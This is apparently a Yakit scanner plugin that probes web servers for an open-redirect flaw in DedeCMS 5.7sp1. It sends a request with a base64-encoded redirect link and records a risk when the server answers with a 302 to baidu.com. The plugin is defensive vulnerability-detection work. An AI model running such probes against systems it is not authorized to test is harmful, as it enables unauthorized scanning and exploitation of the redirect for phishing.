#端口扫描插件，在每一次扫描端口会执行
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet3 = `GET /plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20 HTTP/1.1
Host: {{params(target)}}



`



    rsp,req,_ = poc.HTTP(packet3, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if poc.GetStatusCodeFromResponse(rsp) == 302 && str.MatchAllOfSubString(rsp, "Location: http://www.baidu.com")  {
    yakit.Info("dedecms 5.7sp1 URL重定向漏洞", addr)
    	risk.NewRisk(
    	addr,
        risk.title("dedecms 5.7sp1 URL重定向漏洞"),
        risk.severity("Medium"),
        risk.payload("aHR0cDovL3d3dy5iYWlkdS5jb20"),
        risk.titleVerbose("dedecms 5.7sp1 URL重定向漏洞"),
        risk.type('logic'), 
        risk.parameter("link"), 
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.description("dedecms 5.7sp1 URL重定向漏洞"),
        risk.solution("在跳转之前对$link参数进行判断，非本站url则跳转到首页或错误提示页面。"),
        risk.cve("no cve"),
    )	
    }
    return	

}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
